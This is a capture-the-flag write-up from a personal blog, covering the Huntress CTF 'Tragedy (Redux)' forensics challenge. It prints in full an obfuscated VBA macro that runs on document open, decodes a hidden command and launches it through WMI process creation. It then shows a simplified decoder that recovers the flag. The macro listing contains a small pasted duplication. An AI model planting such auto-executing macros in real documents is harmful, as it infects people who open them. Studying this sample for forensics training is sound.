---
title: "Tragedy (Redux)"
date: 2023-10-15T13:11:20-10:01
#draft: true
tags: ['CTF','Writeups', 'Forensics', 'Medium']
---
 
# [Home](https://jjolley91.github.io/blog/) >

###  [Huntress CTF](https://jjolley91.github.io/blog/huntress_ctf_2023) >  [Medium Challenges](https://jjolley91.github.io/blog/huntress_ctf_2023/2.medium/)

## [Back](https://jjolley91.github.io/blog/huntress_ctf_2023/opendir)  <> [Next](https://jjolley91.github.io/blog/huntress_ctf_2023/2.medium/rock_paper_psychic) 

### We found this file as part of an attack chain that seemed to manipulate file contents to stage a payload. Can you make any sense of it?


For this challenge we are given the file "tragedy_redux.7z" to download, and told the password is 'infected'.

### Note: Tragedy began with tragedy...In the original version of this challenge, once you unzipped the file the flag.txt was immediately readable. They Fixed the error and re-released the challenge as 'tragedy-redux'.

Once you extract the file, you are given the file 'tragedy_redux'. Running the file command on this reveals that it is still a compressed archive, so you need to unzip it again:
```bash 
unzip tragedy_redux
```
This will leave you with several files and directories to sift through. Eventually, we came across a file 'vbaProject.bin' which we were able to parse using [olevba](https://github.com/decalage2/oletools/wiki/olevba) from Didlier Stevens.
```bash 
sudo -H pip install -U oletools[full]
```
Then 
```bash
olevba vbaProject.bin
```
From this, we get a VBA macro:
```vb
VBA MACRO NewMacros.bas 
in file: vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function SVBA MACRO NewMacros.bas 
in file: vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    OatMilk = OatMilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = OatMilk
End Function
Function Bears(Cows)
    Bears = StrReverse(Cows)
End Function

Function Tragedy()
    
    Dim Apples As String
    Dim Water As String

    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
        Exit Function
    End If
    
    Apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    Water = Nuts(Apples)


    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin

End Function

Sub AutoOpen()
    Tragedy
End Sub
```

The script automatically executes the Tragedy function within the AutoOpen() subroutine when the document is opened. At a high level, it checks for a specific document name, assigns a long string to variable Apples, then feeds Apples to a series of nested functions that decode the string into readable output that would contain the flag.

Running this script as-is was tedious due to its checks and difficulties in setting up the correct environment. Eventually, we identified its core logic and simplified the code enoough to be able to run reliably and with ease:

```vb 
Module VBModule
    Sub Main()
        Dim Milk As String
        Dim Oatmilk As String
        Milk = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
        Do
        Oatmilk = Oatmilk + Chr((Left(Milk, 3)) - 17)
        Milk = Right(Milk, Len(Milk) - 3)
        Loop While Len(Milk) > 0
        Console.WriteLine(Oatmilk)
    End Sub
End Module
```
We utilized an [online compiler](https://onecompiler.com/vb), and recieved an output that was base64 encoded. We decoded the output and retrieved the flag!

![tragedy](https://github.com/jjolley91/blog/blob/main/static/Huntress_CTF_2023/tragedy.png?raw=true)

## [Back](https://jjolley91.github.io/blog/huntress_ctf_2023/opendir)  <> [Next](https://jjolley91.github.io/blog/huntress_ctf_2023/2.medium/rock_paper_psychic)